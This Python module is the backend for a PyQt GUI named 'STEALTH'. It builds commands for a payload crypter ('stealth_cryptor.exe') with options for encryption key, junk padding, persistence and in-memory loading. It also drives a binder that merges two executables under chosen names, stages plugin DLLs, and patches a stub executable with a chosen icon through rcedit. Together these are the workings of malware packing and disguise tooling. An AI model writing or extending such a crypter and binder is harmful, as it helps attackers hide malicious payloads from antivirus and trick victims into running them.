#!/usr/bin/env python3
"""Backend helpers for the STEALTH PyQt GUI.
- Builds packer commands
- Stages plugins into a temporary folder
- Runs the packer subprocess asynchronously with captured stdout/stderr
"""
import os
import json
import shutil
import subprocess
import threading
import tempfile
from pathlib import Path

# Try PyQt6 then PyQt5 for signals/QObject
try:  # pragma: no cover - runtime import preference
    from PyQt6 import QtCore
    QtSignal = QtCore.pyqtSignal
except Exception:  # pragma: no cover - runtime import preference
    from PyQt5 import QtCore
    QtSignal = QtCore.pyqtSignal


class SubprocessWorker(QtCore.QObject):
    """Runs a subprocess on a Python thread and emits Qt signals for output/finish."""
    line = QtSignal(str)
    finished_rc = QtSignal(int)

    def __init__(self, cmd, env=None, cwd=None, parent=None, stub_swap=None):
        super().__init__(parent)
        self.cmd = cmd
        self.env = env or os.environ.copy()
        self.cwd = cwd
        self._thread = None
        self._stub_swap = stub_swap or None
        self._cleanup_paths = []

    def start(self):
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self):
        rc = -1
        try:
            # swap stub.exe if requested
            if self._stub_swap:
                orig = Path(self._stub_swap['orig'])
                override = Path(self._stub_swap['override'])
                backup = self._stub_swap.get('backup')
                if backup:
                    try:
                        shutil.copy2(orig, backup)
                    except Exception:
                        pass
                try:
                    shutil.copy2(override, orig)
                except Exception:
                    pass
                try:
                    self._cleanup_paths.append(str(override))
                except Exception:
                    pass
            creation_flags = 0
            if hasattr(subprocess, 'CREATE_NO_WINDOW'):
                creation_flags = subprocess.CREATE_NO_WINDOW
            result = subprocess.run(
                self.cmd,
                capture_output=True,
                text=True,
                creationflags=creation_flags,
                env=self.env,
                cwd=self.cwd,
            )
            if result.stdout:
                for ln in result.stdout.splitlines():
                    try:
                        self.line.emit(ln)
                    except Exception:
                        pass
            if result.stderr:
                for ln in result.stderr.splitlines():
                    try:
                        self.line.emit(f"[ERR] {ln}")
                    except Exception:
                        pass
            rc = result.returncode
        except Exception as exc:  # pragma: no cover - defensive
            try:
                self.line.emit(f"[ERR] Worker exception: {exc}")
            except Exception:
                pass
            rc = -1
        finally:
            # restore stub.exe if swapped
            if self._stub_swap:
                orig = Path(self._stub_swap['orig'])
                backup = self._stub_swap.get('backup')
                try:
                    if backup and Path(backup).exists():
                        shutil.copy2(backup, orig)
                        try:
                            Path(backup).unlink()
                        except Exception:
                            pass
                    else:
                        # if no backup, do nothing (leave override)
                        pass
                except Exception:
                    pass
            # cleanup temp files
            for p in self._cleanup_paths:
                try:
                    Path(p).unlink()
                except Exception:
                    pass
            try:
                self.finished_rc.emit(rc)
            except Exception:
                pass


class Backend(QtCore.QObject):
    line = QtSignal(str)
    finished_rc = QtSignal(int)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._worker = None
        self._root = Path(__file__).resolve().parent.parent
        self._bin = self._root / 'bin'
        self._rcedit_primary = self._bin / 'rcedit-x64.exe'
        self._rcedit_fallback = self._root / 'rcedit-x64.exe'

    def build_command(self, payload_path, output_path, key_text, junk_mb, load_in_memory, log_fn=None, warn_fn=None):
        payload = Path(payload_path or '')
        output = Path(output_path or '')
        if not payload.exists() or not payload.is_file():
            raise ValueError('Payload path invalid or missing')
        if not output.parent.exists():
            output.parent.mkdir(parents=True, exist_ok=True)
        key = (key_text or '').strip()
        generated = False
        if not key:
            key = os.urandom(32).hex()
            generated = True
            if log_fn:
                log_fn(f"Generated random key: {key}")
        junk_mb = str(int(junk_mb))
        persistence = '0'
        load_in_mem_flag = '1' if load_in_memory else '0'
        cryptor = self._bin / 'stealth_cryptor.exe'
        if not cryptor.exists() and warn_fn:
            warn_fn(f'`{cryptor}` not found; build it first (bin/).')
        cmd = [str(cryptor), str(payload), str(output), key, junk_mb, persistence, load_in_mem_flag]
        return cmd, key, generated

    def build_binder_command(self, exe1, exe2, output_path, name1=None, name2=None, icon_path=None, warn_fn=None):
        exe1 = Path(exe1 or '')
        exe2 = Path(exe2 or '')
        out = Path(output_path or '')
        if not exe1.exists():
            raise ValueError('Primary executable (exe1) missing')
        if not exe2.exists():
            raise ValueError('Secondary executable (exe2) missing')
        if not out.parent.exists():
            out.parent.mkdir(parents=True, exist_ok=True)
        binder = self._bin / 'binder.exe'
        if not binder.exists() and warn_fn:
            warn_fn(f'`{binder}` not found; build it first (bin/).')
        n1 = name1 or exe1.name
        n2 = name2 or exe2.name
        icon = icon_path or ''
        return [str(binder), str(exe1), str(exe2), str(out), n1, n2, icon]

    def stage_plugins(self, plugin_entries, log_fn=None, warn_fn=None):
        """Stage plugin DLLs into a temporary folder; returns (temp_dir, copied_paths)."""
        if not plugin_entries:
            return None, []
        cwd = Path.cwd()
        import time, random
        rnd = random.randint(1000, 9999)
        plugins_dir = cwd / f'plugins_gui_{int(time.time())}_{rnd}'
        copied = []
        try:
            plugins_dir.mkdir(parents=True, exist_ok=False)
        except Exception as e:
            if warn_fn:
                warn_fn(f"Could not create temporary plugins folder: {e}")
            return None, copied
        for entry in plugin_entries:
            src = Path(entry.get('path') or '')
            if not src.exists():
                if warn_fn:
                    warn_fn(f"Plugin not found: {src}")
                continue
            dest = plugins_dir / src.name
            try:
                shutil.copy2(str(src), str(dest))
                copied.append(str(dest))
                stage = int(entry.get('stage', 0))
                order = int(entry.get('order', 0))
                meta_path = plugins_dir / (src.name + '.meta')
                with open(meta_path, 'w', encoding='utf-8') as mf:
                    mf.write(f"stage={stage}\n")
                    mf.write(f"order={order}\n")
                copied.append(str(meta_path))
            except Exception as e:
                if warn_fn:
                    warn_fn(f"Failed to copy plugin {src} -> {dest}: {e}")
        if copied and log_fn:
            log_fn(f"Staged plugins into temporary folder: {plugins_dir}")
        return str(plugins_dir), copied

    def cleanup_plugins(self, temp_dir):
        if not temp_dir:
            return
        try:
            shutil.rmtree(temp_dir)
        except Exception:
            pass

    def start_process(self, cmd, plugin_dir=None, disable_plugins_default=False, workdir=None, icon_stub_override=None):
        env = os.environ.copy()
        if plugin_dir:
            env['PLUGIN_DIR'] = plugin_dir
        else:
            env.pop('PLUGIN_DIR', None)  # ensure stale value is cleared
            if disable_plugins_default:
                env['PLUGIN_DIR_DISABLE'] = "1"
        stub_swap = None
        if icon_stub_override:
            try:
                orig = Path(workdir or self._bin) / 'stub.exe'
                backup = orig.with_name('stub_backup_auto.exe') if orig.exists() else None
                stub_swap = {'orig': str(orig), 'override': str(icon_stub_override), 'backup': str(backup) if backup else None}
            except Exception:
                stub_swap = None
        worker = SubprocessWorker(cmd, env=env, cwd=workdir, stub_swap=stub_swap)
        worker.line.connect(self.line)
        worker.finished_rc.connect(self.finished_rc)
        worker.start()
        self._worker = worker
        return worker

    def prepare_iconized_stub(self, icon_path, log_fn=None, warn_fn=None):
        stub = self._bin / 'stub.exe'
        if not stub.exists():
            if warn_fn:
                warn_fn(f"stub.exe not found at {stub}; cannot apply icon")
            return None
        tmp_fd, tmp_path = tempfile.mkstemp(prefix="stub_iconized_", suffix=".exe")
        os.close(tmp_fd)
        tmp = Path(tmp_path)
        try:
            shutil.copy2(stub, tmp)
            ok = self.apply_icon(tmp, icon_path, log_fn=log_fn, warn_fn=warn_fn)
            if ok:
                return str(tmp)
        except Exception as exc:
            if warn_fn:
                warn_fn(f"Icon prep failed: {exc}")
        try:
            if tmp.exists():
                tmp.unlink()
        except Exception:
            pass
        return None

    def apply_icon(self, exe_path, icon_path, log_fn=None, warn_fn=None):
        exe = Path(exe_path or '')
        icon = Path(icon_path or '')
        if not exe.exists():
            if warn_fn:
                warn_fn(f"Icon apply skipped; target missing: {exe}")
            return False
        if not icon.exists():
            if warn_fn:
                warn_fn(f"Icon apply skipped; icon missing: {icon}")
            return False
        # Basic ICO header validation; if invalid, attempt conversion via Pillow
        try:
            with open(icon, 'rb') as fh:
                hdr = fh.read(4)
            if hdr != b'\x00\x00\x01\x00':
                if log_fn:
                    log_fn("Icon is not a valid ICO; attempting conversion to .ico")
                converted = self.convert_to_ico(icon, output_base=exe, log_fn=log_fn, warn_fn=warn_fn)
                if converted and Path(converted).exists():
                    icon = Path(converted)
                else:
                    if warn_fn:
                        warn_fn("Icon conversion failed; skipping icon patch")
                    return False
        except Exception:
            pass
        rcedit_path = None
        if self._rcedit_primary.exists():
            rcedit_path = self._rcedit_primary
        elif self._rcedit_fallback.exists():
            rcedit_path = self._rcedit_fallback
        if not rcedit_path:
            if warn_fn:
                warn_fn(f"rcedit not found at {self._rcedit_primary} or {self._rcedit_fallback}; skipping icon patch")
            return False
        cmd = [str(rcedit_path), str(exe), '--set-icon', str(icon)]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                msg = result.stderr.strip() or f"rcedit failed with code {result.returncode}"
                if warn_fn:
                    warn_fn(f"Icon patch failed: {msg}")
                return False
            if log_fn:
                chosen = str(rcedit_path)
                log_fn(f"Applied icon to {exe.name} using {icon.name} (rcedit: {chosen})")
            return True
        except Exception as exc:  # pragma: no cover - defensive
            if warn_fn:
                warn_fn(f"Icon apply failed: {exc}")
            return False

    def convert_to_ico(self, image_path, output_base=None, log_fn=None, warn_fn=None):
        try:
            from PIL import Image
        except Exception:
            if warn_fn:
                warn_fn("Pillow not installed; cannot convert icon to .ico. Install pillow or choose a .ico file.")
            return None
        src = Path(image_path)
        if not src.exists():
            if warn_fn:
                warn_fn(f"Icon conversion skipped; file missing: {src}")
            return None
        try:
            img = Image.open(src).convert("RGBA")
            target_size = 256
            img = img.resize((target_size, target_size))
            base = Path(output_base) if output_base else src.with_suffix('')
            temp_ico = base.with_suffix('.ico')
            img.save(temp_ico, format='ICO')
            if log_fn:
                log_fn(f"Converted icon to ICO: {temp_ico}")
            return temp_ico
        except Exception as exc:
            if warn_fn:
                warn_fn(f"Icon conversion failed: {exc}")
            return None
